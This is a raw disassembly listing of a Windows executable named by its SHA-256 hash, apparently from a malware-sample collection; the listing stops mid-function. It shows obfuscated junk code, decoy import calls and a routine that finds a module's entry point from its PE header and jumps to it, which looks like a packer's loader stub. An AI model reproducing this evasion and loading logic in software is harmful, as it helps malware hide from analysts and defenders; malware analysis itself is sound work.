
eca34324273cd0f2ee6ec1867549c661cc5ac9b1caddd5890a591182cedf401e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x422014,0x420f98
  401013:	push   edi
  401014:	sub    DWORD PTR ds:0x420fb0,0x420e8e
  40101e:	push   0x424545
  401023:	xor    edi,edi
  401025:	and    DWORD PTR ds:0x420efc,0x110f
  40102f:	inc    edi
  401030:	push   edi
  401031:	sbb    DWORD PTR ds:0x420f08,0x51
  40103b:	push   edi
  40103c:	adc    DWORD PTR ds:0x422000,0x3888
  401046:	call   DWORD PTR ds:0x4247ed
  40104c:	test   eax,eax
  40104e:	mov    DWORD PTR ds:0x420e8a,0x96
  401058:	je     0x40106f
  40105e:	xor    eax,eax
  401060:	mov    DWORD PTR ds:0x420ef0,0x42a7
  40106a:	jmp    0x4020ba
  40106f:	push   esi
  401070:	sbb    DWORD PTR ds:0x420e96,ebx
  401076:	mov    esi,DWORD PTR ds:0x4247e9
  40107c:	push   0x8
  40107e:	and    DWORD PTR ds:0x420e96,0x420ef4
  401088:	push   0x424565
  40108d:	sbb    DWORD PTR ds:0x420fa8,0x2663
  401097:	call   esi
  401099:	mov    DWORD PTR ds:0x420f58,0x2539
  4010a3:	test   eax,eax
  4010a5:	mov    DWORD PTR ds:0x420f74,0x63dd
  4010af:	jne    0x401117
  4010b5:	push   0xc
  4010b7:	adc    DWORD PTR ds:0x420efc,0x422010
  4010c1:	push   0x424579
  4010c6:	call   esi
  4010c8:	sbb    DWORD PTR ds:0x422000,0x6696
  4010d2:	test   eax,eax
  4010d4:	jne    0x401117
  4010da:	xor    DWORD PTR ds:0x422010,0x3be2
  4010e4:	push   0x42458d
  4010e9:	adc    DWORD PTR ds:0x420fac,0x420fa0
  4010f3:	push   edi
  4010f4:	push   edi
  4010f5:	call   DWORD PTR ds:0x424819
  4010fb:	add    DWORD PTR ds:0x420e7e,0x14dc
  401105:	test   eax,eax
  401107:	mov    DWORD PTR ds:0x420f08,0x3170
  401111:	je     0x401128
  401117:	xor    eax,eax
  401119:	mov    DWORD PTR ds:0x422014,0x5c19
  401123:	jmp    0x4020b9
  401128:	sbb    esi,DWORD PTR ds:0x420e9a
  40112e:	mov    DWORD PTR [ebp-0x10],0x0
  401135:	and    edi,0x6e17
  40113b:	mov    eax,DWORD PTR [ebp-0x24]
  40113e:	mov    DWORD PTR [ebp-0x24],eax
  401141:	sub    esi,DWORD PTR ds:0x420fa0
  401147:	mov    ecx,0xf89c85b5
  40114c:	mov    DWORD PTR [ebp-0x8],ecx
  40114f:	sub    esi,DWORD PTR ds:0x420f00
  401155:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  40115c:	sbb    edx,DWORD PTR ds:0x420e92
  401162:	lea    eax,[ebp-0x38]
  401165:	mov    DWORD PTR [ebp-0x2c],eax
  401168:	adc    DWORD PTR ds:0x420f74,edi
  40116e:	lea    eax,[ebp-0x30]
  401171:	xor    esi,esi
  401173:	or     esi,DWORD PTR ds:0x420e9a
  401179:	and    DWORD PTR ds:0x420f64,esi
  40117f:	mov    DWORD PTR [ebp-0x1c],eax
  401182:	sbb    esi,eax
  401184:	mov    eax,ds:0x424435
  401189:	mov    edi,DWORD PTR ds:0x420f48
  40118f:	mov    edx,DWORD PTR ds:0x420f84
  401195:	sub    edx,edi
  401197:	sub    edi,DWORD PTR [edi+edx*1]
  40119a:	mov    eax,DWORD PTR [eax+0x1c8]
  4011a0:	mov    eax,DWORD PTR [eax]
  4011a2:	mov    edx,DWORD PTR [ebp-0x1c]
  4011a5:	movzx  edi,BYTE PTR ds:0x420fb4
  4011ac:	add    DWORD PTR ds:0x420e8a,edi
  4011b2:	mov    esi,0x7510896
  4011b7:	xor    eax,esi
  4011b9:	and    DWORD PTR ds:0x420fa0,0x420e96
  4011c3:	mov    edi,0x3272dd
  4011c8:	add    eax,edi
  4011ca:	mov    DWORD PTR [edx],eax
  4011cc:	mov    DWORD PTR ds:0x420ea2,0x7e11
  4011d6:	mov    eax,ds:0x424675
  4011db:	cmp    eax,0x312bc9f6
  4011e0:	mov    DWORD PTR ds:0x420fa4,0x3707
  4011ea:	jne    0x40133f
  4011f0:	mov    eax,DWORD PTR [ebp-0x8]
  4011f3:	mov    edx,DWORD PTR ds:0x424435
  4011f9:	mov    edx,DWORD PTR [edx+0x198]
  4011ff:	xor    eax,esi
  401201:	add    eax,edi
  401203:	add    DWORD PTR ds:0x422010,0x420eec
  40120d:	mov    DWORD PTR [edx],eax
  40120f:	and    DWORD PTR ds:0x42200c,0x0
  401219:	jmp    0x40122d
  40121e:	xor    edx,edx
  401220:	add    edx,DWORD PTR ds:0x42200c
  401226:	inc    edx
  401227:	mov    DWORD PTR ds:0x42200c,edx
  40122d:	cmp    DWORD PTR ds:0x42200c,0x12
  401234:	jae    0x401276
  40123a:	cmp    DWORD PTR ds:0x42200c,0x5
  401241:	jne    0x401255
  401247:	push   DWORD PTR [ebp-0x18]
  40124a:	push   0x450b
  40124f:	call   DWORD PTR ds:0x4247d5
  401255:	cmp    DWORD PTR ds:0x42200c,0x4
  40125c:	jne    0x401271
  401262:	xor    edx,edx
  401264:	add    edx,DWORD PTR ds:0x42200c
  40126a:	inc    edx
  40126b:	mov    DWORD PTR ds:0x42200c,edx
  401271:	jmp    0x40121e
  401276:	mov    eax,DWORD PTR [ebp-0x8]
  401279:	and    DWORD PTR ds:0x420f70,0x0
  401283:	mov    edx,DWORD PTR ds:0x420f70
  401289:	inc    edx
  40128a:	mov    DWORD PTR ds:0x420f70,edx
  401290:	cmp    DWORD PTR ds:0x420f70,0x7
  401297:	jne    0x4012b0
  40129d:	push   0x5d66
  4012a2:	push   0x420f60
  4012a7:	push   DWORD PTR [ebp-0x14]
  4012aa:	call   DWORD PTR ds:0x4247d9
  4012b0:	cmp    DWORD PTR ds:0x420f70,0x6
  4012b7:	jne    0x4012ca
  4012bd:	mov    edx,DWORD PTR ds:0x420f70
  4012c3:	inc    edx
  4012c4:	mov    DWORD PTR ds:0x420f70,edx
  4012ca:	cmp    DWORD PTR ds:0x420f70,0x14
  4012d1:	jb     0x401283
  4012d7:	and    edx,0x4d07
  4012dd:	xor    eax,esi
  4012df:	movzx  edx,BYTE PTR ds:0x420f08
  4012e6:	sub    edx,DWORD PTR ds:0x420fa0
  4012ec:	mov    DWORD PTR ds:0x420f08,edx
  4012f2:	add    eax,edi
  4012f4:	mov    DWORD PTR ds:0x422008,0x18
  4012fe:	cmp    DWORD PTR ds:0x422008,0x0
  401305:	je     0x40133a
  40130b:	cmp    DWORD PTR ds:0x422008,0x1d
  401312:	jne    0x401328
  401318:	push   0x42406a
  40131d:	push   0x424044
  401322:	call   DWORD PTR ds:0x4247dd
  401328:	mov    edx,DWORD PTR ds:0x422008
  40132e:	dec    edx
  40132f:	mov    DWORD PTR ds:0x422008,edx
  401335:	jmp    0x4012fe
  40133a:	mov    ds:0x424675,eax
  40133f:	mov    eax,ds:0x424435
  401344:	and    DWORD PTR ds:0x420ef4,0x0
  40134e:	mov    edx,DWORD PTR ds:0x420ef4
  401354:	inc    edx
  401355:	mov    DWORD PTR ds:0x420ef4,edx
  40135b:	cmp    DWORD PTR ds:0x420ef4,0x20
  401362:	jne    0x401379
  401368:	push   DWORD PTR [ebp-0x18]
  40136b:	push   0x222d
  401370:	push   DWORD PTR [ebp-0x28]
  401373:	call   DWORD PTR ds:0x4247e1
  401379:	cmp    DWORD PTR ds:0x420ef4,0x12
  401380:	jb     0x40134e
  401386:	mov    eax,DWORD PTR [eax+0x18c]
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	adc    DWORD PTR ds:0x422014,0x7308
  401398:	mov    DWORD PTR [ebp-0x68],eax
  40139b:	and    DWORD PTR ds:0x420e7e,0x0
  4013a5:	xor    eax,eax
  4013a7:	or     eax,DWORD PTR ds:0x420e7e
  4013ad:	inc    eax
  4013ae:	mov    ds:0x420e7e,eax
  4013b3:	cmp    DWORD PTR ds:0x420e7e,0xa
  4013ba:	jne    0x4013d1
  4013c0:	push   DWORD PTR [ebp-0x20]
  4013c3:	push   0x420f74
  4013c8:	push   DWORD PTR [ebp-0x28]
  4013cb:	call   DWORD PTR ds:0x4247e5
  4013d1:	cmp    DWORD PTR ds:0x420e7e,0x9
  4013d8:	jne    0x4013ec
  4013de:	xor    eax,eax
  4013e0:	xor    eax,DWORD PTR ds:0x420e7e
  4013e6:	inc    eax
  4013e7:	mov    ds:0x420e7e,eax
  4013ec:	cmp    DWORD PTR ds:0x420e7e,0x14
  4013f3:	jb     0x4013a5
  4013f9:	mov    DWORD PTR ds:0x420f04,0x16
  401403:	cmp    DWORD PTR ds:0x420f04,0x0
  40140a:	je     0x401438
  401410:	cmp    DWORD PTR ds:0x420f04,0x22
  401417:	jne    0x401423
  40141d:	call   DWORD PTR ds:0x4247f1
  401423:	xor    eax,eax
  401425:	or     eax,DWORD PTR ds:0x420f04
  40142b:	dec    eax
  40142c:	mov    ds:0x420f04,eax
  401431:	jmp    0x401403
  401436:	sub    edx,edx
  401438:	push   ebx
  401439:	or     eax,DWORD PTR ds:0x420f00
  40143f:	mov    ebx,0xf89c85b1
  401444:	and    DWORD PTR ds:0x420fa0,0x0
  40144e:	mov    edx,DWORD PTR ds:0x420fa0
  401454:	inc    edx
  401455:	mov    DWORD PTR ds:0x420fa0,edx
  40145b:	cmp    DWORD PTR ds:0x420fa0,0x8
  401462:	jne    0x40146e
  401468:	call   DWORD PTR ds:0x4247f5
  40146e:	cmp    DWORD PTR ds:0x420fa0,0x7
  401475:	jne    0x40148a
  40147b:	xor    edx,edx
  40147d:	xor    edx,DWORD PTR ds:0x420fa0
  401483:	inc    edx
  401484:	mov    DWORD PTR ds:0x420fa0,edx
  40148a:	cmp    DWORD PTR ds:0x420fa0,0x1e
  401491:	jb     0x40144e
  401497:	and    DWORD PTR ds:0x420e7a,0x0
  4014a1:	jmp    0x4014b3
  4014a6:	mov    edx,DWORD PTR ds:0x420e7a
  4014ac:	inc    edx
  4014ad:	mov    DWORD PTR ds:0x420e7a,edx
  4014b3:	cmp    DWORD PTR ds:0x420e7a,0x14
  4014ba:	jae    0x4014ff
  4014c0:	cmp    DWORD PTR ds:0x420e7a,0x1f
  4014c7:	jne    0x4014f0
  4014cd:	push   0x20c6
  4014d2:	push   DWORD PTR [ebp-0x10]
  4014d5:	push   0x420ea2
  4014da:	push   0x440c
  4014df:	push   DWORD PTR [ebp-0x20]
  4014e2:	push   0x7f92
  4014e7:	push   DWORD PTR [ebp-0x20]
  4014ea:	call   DWORD PTR ds:0x4247f9
  4014f0:	jmp    0x4014a6
  4014f5:	adc    DWORD PTR ds:0x420ea2,0x7cfc
  4014ff:	mov    DWORD PTR [ebp-0x10],ebx
  401502:	sub    DWORD PTR ds:0x420f5c,edi
  401508:	mov    DWORD PTR [ebp-0x10],ebx
  40150b:	mov    DWORD PTR ds:0x420f04,0x12
  401515:	cmp    DWORD PTR ds:0x420f04,0x0
  40151c:	je     0x40156b
  401522:	cmp    DWORD PTR ds:0x420f04,0x5
  401529:	jne    0x40153d
  40152f:	push   DWORD PTR [ebp-0x1c]
  401532:	push   0x424044
  401537:	call   DWORD PTR ds:0x4247fd
  40153d:	cmp    DWORD PTR ds:0x420f04,0x6
  401544:	jne    0x401557
  40154a:	mov    edx,DWORD PTR ds:0x420f04
  401550:	dec    edx
  401551:	mov    DWORD PTR ds:0x420f04,edx
  401557:	xor    edx,edx
  401559:	or     edx,DWORD PTR ds:0x420f04
  40155f:	dec    edx
  401560:	mov    DWORD PTR ds:0x420f04,edx
  401566:	jmp    0x401515
  40156b:	mov    DWORD PTR [ebp-0x10],ebx
  40156e:	and    DWORD PTR ds:0x422004,0x0
  401578:	jmp    0x40158c
  40157d:	xor    edx,edx
  40157f:	xor    edx,DWORD PTR ds:0x422004
  401585:	inc    edx
  401586:	mov    DWORD PTR ds:0x422004,edx
  40158c:	cmp    DWORD PTR ds:0x422004,0x12
  401593:	jae    0x4015bd
  401599:	cmp    DWORD PTR ds:0x422004,0x1e
  4015a0:	jne    0x4015b8
  4015a6:	push   0x424168
  4015ab:	push   0x1
  4015ad:	push   0x0
  4015af:	push   DWORD PTR [ebp-0x14]
  4015b2:	call   DWORD PTR ds:0x424801
  4015b8:	jmp    0x40157d
  4015bd:	mov    DWORD PTR [ebp-0x1c],ecx
  4015c0:	xor    edx,edx
  4015c2:	mov    DWORD PTR [ebp-0x10],ebx
  4015c5:	mov    DWORD PTR ds:0x420e96,0xb45
  4015cf:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4015d6:	and    DWORD PTR ds:0x422014,0x2ed5
  4015e0:	mov    eax,DWORD PTR [ebp-0x8]
  4015e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4015e6:	xor    edx,edx
  4015e8:	or     edx,DWORD PTR ds:0x420f60
  4015ee:	and    DWORD PTR ds:0x422000,edx
  4015f4:	mov    edx,DWORD PTR [ebp-0xc]
  4015f7:	sbb    DWORD PTR ds:0x420fa0,0x420fb4
  401601:	xor    edx,esi
  401603:	and    DWORD PTR ds:0x420f5c,0x420fa4
  40160d:	xor    ecx,esi
  40160f:	sub    DWORD PTR ds:0x422008,0x420f58
  401619:	add    ecx,edx
  40161b:	sbb    DWORD PTR ds:0x420e8e,edi
  401621:	mov    edx,DWORD PTR [ebp-0xc]
  401624:	xor    DWORD PTR ds:0x420f00,0x7b1e
  40162e:	xor    eax,esi
  401630:	xor    edx,esi
  401632:	or     DWORD PTR ds:0x420e9a,0x7d42
  40163c:	add    eax,edi
  40163e:	lea    ecx,[ecx+edx*1+0x975897]
  401645:	not    DWORD PTR ds:0x420f70
  40164b:	mov    DWORD PTR [ebp-0x18],eax
  40164e:	mov    DWORD PTR ds:0x420e7e,0x57b9
  401658:	cmp    eax,ecx
  40165a:	ja     0x40177e
  401660:	jmp    0x401678
  401665:	mov    eax,ds:0x420f30
  40166a:	mov    ecx,DWORD PTR ds:0x420f38
  401670:	sub    ecx,eax
  401672:	and    eax,DWORD PTR [eax+ecx*1]
  401675:	mov    eax,DWORD PTR [ebp-0x18]
  401678:	mov    ecx,DWORD PTR [ebp-0xc]
  40167b:	sub    DWORD PTR ds:0x422010,0x420f70
  401685:	xor    ecx,esi
  401687:	lea    eax,[ecx+eax*1+0x3272dd]
  40168e:	or     DWORD PTR ds:0x420f70,0x48c8
  401698:	push   eax
  401699:	sub    DWORD PTR ds:0x420e9e,0x506d
  4016a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4016a6:	and    DWORD PTR ds:0x420f5c,0x3822
  4016b0:	xor    eax,esi
  4016b2:	xor    DWORD PTR ds:0x420f74,0x420ef0
  4016bc:	lea    eax,[ebp+eax*1+0x3272e5]
  4016c3:	or     DWORD PTR ds:0x420ea2,0x420f60
  4016cd:	push   eax
  4016ce:	or     DWORD PTR ds:0x420f00,0x5827
  4016d8:	mov    eax,ds:0x424435
  4016dd:	and    DWORD PTR ds:0x420fb4,0x420fa4
  4016e7:	push   DWORD PTR [eax+0x1bc]
  4016ed:	xor    DWORD PTR ds:0x420f98,0x420ea2
  4016f7:	call   0x4020cd
  4016fc:	add    DWORD PTR ds:0x420f68,0x6b04
  401706:	mov    eax,DWORD PTR [ebp-0xc]
  401709:	or     edx,DWORD PTR ds:0x420ef0
  40170f:	mov    ecx,DWORD PTR [ebp-0x18]
  401712:	neg    edx
  401714:	xor    eax,esi
  401716:	sub    edx,0x4f8d
  40171c:	lea    eax,[ecx+eax*1+0x3272dd]
  401723:	mov    ecx,DWORD PTR [ebp-0xc]
  401726:	xor    edx,DWORD PTR ds:0x420e7a
  40172c:	mov    edx,DWORD PTR [ebp-0xc]
  40172f:	xor    edx,esi
  401731:	add    DWORD PTR ds:0x420ef4,0x420e9e
  40173b:	xor    ecx,esi
  40173d:	adc    DWORD PTR ds:0x420e82,0x420f5c
  401747:	add    ecx,edx
  401749:	mov    edx,DWORD PTR [ebp-0xc]
  40174c:	xor    edx,esi
  40174e:	lea    ecx,[ecx+edx*1+0x975897]
  401755:	mov    DWORD PTR ds:0x420e82,0x59f5
  40175f:	mov    DWORD PTR [ebp-0x18],eax
  401762:	mov    DWORD PTR ds:0x420f98,0x3280
  40176c:	cmp    eax,ecx
  40176e:	mov    DWORD PTR ds:0x420fb4,0x7b83
  401778:	jbe    0x401665
  40177e:	and    DWORD PTR ds:0x420f98,0x0
  401788:	mov    ecx,DWORD PTR ds:0x420f98
  40178e:	inc    ecx
  40178f:	mov    DWORD PTR ds:0x420f98,ecx
  401795:	cmp    DWORD PTR ds:0x420f98,0x1e
  40179c:	jne    0x4017b2
  4017a2:	push   0x420fa0
  4017a7:	push   0x4d18
  4017ac:	call   DWORD PTR ds:0x424805
  4017b2:	cmp    DWORD PTR ds:0x420f98,0x18
  4017b9:	jb     0x401788
  4017bf:	mov    eax,DWORD PTR [ebp+0xc]
  4017c2:	sbb    DWORD PTR ds:0x420e7a,edx
  4017c8:	mov    ds:0x4242b9,eax
  4017cd:	and    DWORD PTR ds:0x420f74,0x0
  4017d7:	mov    eax,ds:0x420f74
  4017dc:	inc    eax
  4017dd:	mov    ds:0x420f74,eax
  4017e2:	cmp    DWORD PTR ds:0x420f74,0x1b
  4017e9:	jne    0x40180f
  4017ef:	push   DWORD PTR [ebp-0x1c]
  4017f2:	push   0x420f9c
  4017f7:	push   0x46e8
  4017fc:	push   0x4240e4
  401801:	push   0x1c79
  401806:	push   DWORD PTR [ebp-0xc]
  401809:	call   DWORD PTR ds:0x42480d
  40180f:	cmp    DWORD PTR ds:0x420f74,0x12
  401816:	jb     0x4017d7
  40181c:	mov    eax,DWORD PTR [ebp+0x10]
  40181f:	sub    ecx,DWORD PTR ds:0x420fa4
  401825:	mov    ds:0x42450d,eax
  40182a:	and    DWORD PTR ds:0x422010,0x0
  401834:	mov    eax,ds:0x422010
  401839:	inc    eax
  40183a:	mov    ds:0x422010,eax
  40183f:	cmp    DWORD PTR ds:0x422010,0x18
  401846:	jne    0x401852
  40184c:	call   DWORD PTR ds:0x424811
  401852:	cmp    DWORD PTR ds:0x422010,0x17
  401859:	jb     0x401834
  40185f:	add    ecx,ecx
  401861:	mov    eax,ds:0x4242b9
  401866:	or     DWORD PTR ds:0x420e7a,0x2e1b
  401870:	mov    ecx,DWORD PTR [ebp-0x2c]
  401873:	sub    eax,edi
  401875:	neg    DWORD PTR ds:0x420e92
  40187b:	xor    eax,esi
  40187d:	mov    DWORD PTR ds:0x420fac,0x2c59
  401887:	mov    DWORD PTR [ecx],eax
  401889:	mov    ecx,DWORD PTR [ebp-0x24]
  40188c:	mov    DWORD PTR ds:0x420efc,0x2f09
  401896:	mov    eax,0xf89c85b5
  40189b:	mov    DWORD PTR ds:0x420efc,0x2084
  4018a5:	cmp    ecx,eax
  4018a7:	jne    0x401be5
  4018ad:	xor    DWORD PTR ds:0x422014,0x4966
  4018b7:	lea    eax,[ebp-0x34]
  4018ba:	adc    DWORD PTR ds:0x420e8a,0x420e92
  4018c4:	mov    DWORD PTR [ebp-0x70],eax
  4018c7:	xor    DWORD PTR ds:0x420f74,0x422004
  4018d1:	lea    eax,[ebp+0x4]
  4018d4:	sub    DWORD PTR ds:0x420fa4,0x42200c
  4018de:	mov    DWORD PTR [ebp-0x34],eax
  4018e1:	mov    eax,DWORD PTR [ebp-0x34]
  4018e4:	test   eax,eax
  4018e6:	mov    DWORD PTR ds:0x420e82,0x6242
  4018f0:	je     0x40209d
  4018f6:	xor    DWORD PTR ds:0x422008,0x2d73
  401900:	mov    eax,DWORD PTR [ebp-0x20]
  401903:	mov    eax,DWORD PTR [ebp-0xc]
  401906:	mov    eax,DWORD PTR [ebp-0x8]
  401909:	adc    ecx,0x7834
  40190f:	mov    DWORD PTR [ebp+0xc],eax
  401912:	not    ecx
  401914:	mov    eax,eax
  401916:	mov    eax,ds:0x424435
  40191b:	and    DWORD PTR ds:0x422008,0x0
  401925:	mov    ecx,DWORD PTR ds:0x422008
  40192b:	inc    ecx
  40192c:	mov    DWORD PTR ds:0x422008,ecx
  401932:	cmp    DWORD PTR ds:0x422008,0x1e
  401939:	jne    0x40194a
  40193f:	push   0x422000
  401944:	call   DWORD PTR ds:0x424815
  40194a:	cmp    DWORD PTR ds:0x422008,0x1d
  401951:	jb     0x401925
  401957:	and    DWORD PTR ds:0x420fa0,0x0
  401961:	jmp    0x401973
  401966:	mov    ecx,DWORD PTR ds:0x420fa0
  40196c:	inc    ecx
  40196d:	mov    DWORD PTR ds:0x420fa0,ecx
  401973:	cmp    DWORD PTR ds:0x420fa0,0x14
  40197a:	jae    0x4019bc
  401980:	cmp    DWORD PTR ds:0x420fa0,0x5
  401987:	jne    0x40199d
  40198d:	push   0x2f20
  401992:	push   0x8e83
  401997:	call   DWORD PTR ds:0x4247d5
  40199d:	cmp    DWORD PTR ds:0x420fa0,0x4
  4019a4:	jne    0x4019b7
  4019aa:	mov    ecx,DWORD PTR ds:0x420fa0
  4019b0:	inc    ecx
  4019b1:	mov    DWORD PTR ds:0x420fa0,ecx
  4019b7:	jmp    0x401966
  4019bc:	mov    eax,DWORD PTR [eax+0x1c8]
  4019c2:	neg    DWORD PTR ds:0x420f98
  4019c8:	mov    eax,DWORD PTR [eax]
  4019ca:	sbb    DWORD PTR ds:0x420f74,ebx
  4019d0:	cdq    
  4019d1:	adc    DWORD PTR ds:0x42200c,0x4213
  4019db:	mov    ebx,eax
  4019dd:	mov    DWORD PTR ds:0x420fa4,0x17
  4019e7:	cmp    DWORD PTR ds:0x420fa4,0x0
  4019ee:	je     0x401a74
  4019f4:	cmp    DWORD PTR ds:0x420fa4,0x20
  4019fb:	jne    0x401a14
  401a01:	push   DWORD PTR [ebp-0x1c]
  401a04:	push   0x420e9a
  401a09:	push   0x6482
  401a0e:	call   DWORD PTR ds:0x4247d9
  401a14:	xor    eax,eax
  401a16:	or     eax,DWORD PTR ds:0x420fa4
  401a1c:	dec    eax
  401a1d:	mov    ds:0x420fa4,eax
  401a22:	jmp    0x4019e7
  401a27:	mov    DWORD PTR ds:0x420f08,0x1d
  401a31:	cmp    DWORD PTR ds:0x420f08,0x0
  401a38:	je     0x401a74
  401a3e:	cmp    DWORD PTR ds:0x420f08,0x1e
  401a45:	jne    0x401a5b
  401a4b:	push   0x424027
  401a50:	push   0x4240af
  401a55:	call   DWORD PTR ds:0x4247dd
  401a5b:	xor    eax,eax
  401a5d:	xor    eax,DWORD PTR ds:0x420f08
  401a63:	dec    eax
  401a64:	mov    ds:0x420f08,eax
  401a69:	jmp    0x401a31
  401a6e:	and    DWORD PTR ds:0x420e82,ebx
  401a74:	mov    eax,0xfabdbeed
  401a79:	add    ebx,eax
  401a7b:	inc    ecx
  401a7c:	adc    edx,0xffffffff
  401a7f:	mov    DWORD PTR ds:0x420fa0,0x16
  401a89:	cmp    DWORD PTR ds:0x420fa0,0x0
  401a90:	je     0x401b11
  401a96:	cmp    DWORD PTR ds:0x420fa0,0x20
  401a9d:	jne    0x401ab4
  401aa3:	push   DWORD PTR [ebp-0x10]
  401aa6:	push   0x1d23
  401aab:	push   DWORD PTR [ebp-0x1c]
  401aae:	call   DWORD PTR ds:0x4247e1
  401ab4:	xor    ecx,ecx
  401ab6:	xor    ecx,DWORD PTR ds:0x420fa0
  401abc:	dec    ecx
  401abd:	mov    DWORD PTR ds:0x420fa0,ecx
  401ac3:	jmp    0x401a89
  401ac8:	mov    DWORD PTR ds:0x42200c,0x1c
  401ad2:	cmp    DWORD PTR ds:0x42200c,0x0
  401ad9:	je     0x401b11
  401adf:	cmp    DWORD PTR ds:0x42200c,0x2c
  401ae6:	jne    0x401aff
  401aec:	push   0x87f3
  401af1:	push   0x420f68
  401af6:	push   DWORD PTR [ebp-0xc]
  401af9:	call   DWORD PTR ds:0x4247e5
  401aff:	mov    ecx,DWORD PTR ds:0x42200c
  401b05:	dec    ecx
  401b06:	mov    DWORD PTR ds:0x42200c,ecx
  401b0c:	jmp    0x401ad2
  401b11:	and    DWORD PTR [ebp-0x10],0x0
  401b15:	sbb    DWORD PTR ds:0x422014,ebx
  401b1b:	xor    edx,0x0
  401b1e:	xor    ecx,DWORD PTR ds:0x420f70
  401b24:	mov    DWORD PTR [ebp-0x54],edx
  401b27:	adc    ecx,edx
  401b29:	mov    edx,DWORD PTR [ebp+0xc]
  401b2c:	mov    DWORD PTR [ebp-0x14],edx
  401b2f:	mov    ecx,0x8a29a127
  401b34:	xor    ebx,ecx
  401b36:	dec    edx
  401b37:	add    DWORD PTR [ebp-0x14],eax
  401b3a:	mov    DWORD PTR ds:0x420e96,edi
  401b40:	mov    edx,DWORD PTR [ebp-0x14]
  401b43:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401b47:	or     DWORD PTR ds:0x420f6c,0x420f00
  401b51:	xor    edx,ecx
  401b53:	add    DWORD PTR ds:0x420e86,0x420f04
  401b5d:	mov    DWORD PTR [ebp-0x4c],edx
  401b60:	mov    edx,DWORD PTR [ebp-0x10]
  401b63:	xor    edx,0x0
  401b66:	mov    DWORD PTR [ebp-0x48],edx
  401b69:	mov    DWORD PTR ds:0x420efc,0x3c82
  401b73:	cmp    DWORD PTR [ebp-0x4c],ebx
  401b76:	jne    0x401b92
  401b7c:	mov    DWORD PTR ds:0x420e92,0x5ff4
  401b86:	mov    edx,DWORD PTR [ebp-0x54]
  401b89:	cmp    DWORD PTR [ebp-0x48],edx
  401b8c:	je     0x401bc1
  401b92:	mov    edx,DWORD PTR ds:0x424435
  401b98:	mov    edx,DWORD PTR [edx+0x1c0]
  401b9e:	mov    edx,DWORD PTR [edx]
  401ba0:	xor    ebx,ebx
  401ba2:	add    edx,eax
  401ba4:	adc    ebx,0xffffffff
  401ba7:	xor    edx,ecx
  401ba9:	xor    ebx,0x0
  401bac:	cmp    edx,0x70941fc9
  401bb2:	jne    0x40209d
  401bb8:	cmp    ebx,0xffffffff
  401bbb:	jne    0x40209d
  401bc1:	mov    edx,DWORD PTR ds:0x4244b1
  401bc7:	mov    ebx,DWORD PTR ds:0x4244b9
  401bcd:	xor    edx,ebx
  401bcf:	mov    DWORD PTR ds:0x4244b1,edx
  401bd5:	mov    ebx,DWORD PTR ds:0x4244b1
  401bdb:	mov    edx,DWORD PTR [ebp-0x34]
  401bde:	add    DWORD PTR [edx],ebx
  401be0:	jmp    0x40205e
  401be5:	mov    ecx,DWORD PTR [ebp-0x38]
  401be8:	cmp    ecx,0xf89c85b2
  401bee:	je     0x401c4b
  401bf4:	mov    ecx,DWORD PTR [ebp-0x8]
  401bf7:	mov    edx,DWORD PTR [ebp-0x30]
  401bfa:	xor    ecx,esi
  401bfc:	add    ecx,edi
  401bfe:	cmp    ecx,edx
  401c00:	je     0x401c4b
  401c06:	mov    eax,ds:0x424435
  401c0b:	mov    eax,DWORD PTR [eax+0x194]
  401c11:	mov    ecx,DWORD PTR [eax]
  401c13:	mov    eax,DWORD PTR [ecx+0x3c]
  401c16:	push   DWORD PTR ds:0x42450d
  401c1c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c20:	push   DWORD PTR ds:0x4242b9
  401c26:	add    eax,ecx
  401c28:	mov    ecx,DWORD PTR ds:0x424435
  401c2e:	mov    ecx,DWORD PTR [ecx+0x194]
  401c34:	push   DWORD PTR [ecx]
  401c36:	call   eax
  401c38:	mov    ecx,DWORD PTR ds:0x424435
  401c3e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401c44:	mov    DWORD PTR [ecx],eax
  401c46:	jmp    0x40209d
  401c4b:	mov    ecx,DWORD PTR [ebp-0x8]
  401c4e:	mov    edx,DWORD PTR [ebp-0x68]
  401c51:	xor    ecx,esi
  401c53:	add    ecx,edi
  401c55:	cmp    ecx,edx
  401c57:	jne    0x401f61
  401c5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401c60:	mov    edx,DWORD PTR ds:0x424435
  401c66:	mov    edx,DWORD PTR [edx+0x198]
  401c6c:	xor    ecx,esi
  401c6e:	add    ecx,edi
  401c70:	cmp    ecx,DWORD PTR [edx]
  401c72:	jne    0x401c8d
  401c78:	push   eax
  401c79:	mov    eax,DWORD PTR [ebp-0x8]
  401c7c:	xor    eax,esi
  401c7e:	add    eax,edi
  401c80:	push   eax
  401c81:	push   ebx
  401c82:	push   DWORD PTR [ebp-0xc]
  401c85:	push   DWORD PTR [ebp-0x8]
  401c88:	call   0x40772b
  401c8d:	mov    eax,DWORD PTR [ebp-0xc]
  401c90:	mov    DWORD PTR [ebp-0x3c],eax
  401c93:	mov    eax,DWORD PTR [ebp-0x8]
  401c96:	mov    DWORD PTR [ebp-0x18],eax
  401c99:	mov    eax,DWORD PTR [ebp-0x18]
  401c9c:	xor    eax,esi
  401c9e:	add    eax,edi
  401ca0:	mov    DWORD PTR [ebp+0x10],eax
  401ca3:	mov    eax,ds:0x4242b5
  401ca8:	mov    eax,DWORD PTR [eax]
  401caa:	mov    DWORD PTR [ebp+0x10],eax
  401cad:	mov    eax,ds:0x4244bd
  401cb2:	mov    eax,DWORD PTR [eax]
  401cb4:	mov    DWORD PTR [ebp-0x1c],eax
  401cb7:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  401cbe:	mov    eax,DWORD PTR [ebp+0xc]
  401cc1:	xor    eax,esi
  401cc3:	add    eax,edi
  401cc5:	mov    DWORD PTR [ebp+0xc],eax
  401cc8:	mov    eax,ds:0x424435
  401ccd:	mov    DWORD PTR [ebp+0xc],eax
  401cd0:	mov    eax,DWORD PTR [ebp+0x10]
  401cd3:	mov    DWORD PTR [ebp+0xc],eax
  401cd6:	mov    eax,DWORD PTR [ebp+0xc]
  401cd9:	push   0x4
